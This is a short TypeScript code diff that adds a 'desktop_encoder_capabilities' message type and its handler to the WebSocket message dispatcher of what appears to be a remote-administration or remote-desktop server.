@@ -221,6 +221,7 @@ type WsLifecycleDeps = {
   ) => void;
   handleNotificationScreenshotResult: (clientId: string, payload: any) => void;
   handleConsoleOutput: (clientId: string, payload: any) => void;
+  handleDesktopEncoderCapabilities: (clientId: string, payload: any) => void;
   handleFileBrowserMessage: (clientId: string, payload: any) => void;
   handleProxyTunnelData: (clientId: string, connectionId: string, data: Uint8Array) => void;
   handleProxyTunnelClose: (clientId: string, connectionId: string) => void;
@@ -794,6 +795,9 @@ export async function handleWebSocketMessage(
         break;
       case "console_output":
         deps.handleConsoleOutput(client.id, payload);
+        break;
+      case "desktop_encoder_capabilities":
+        deps.handleDesktopEncoderCapabilities(client.id, payload);
         break;
       case "file_list_result":
       case "file_download":
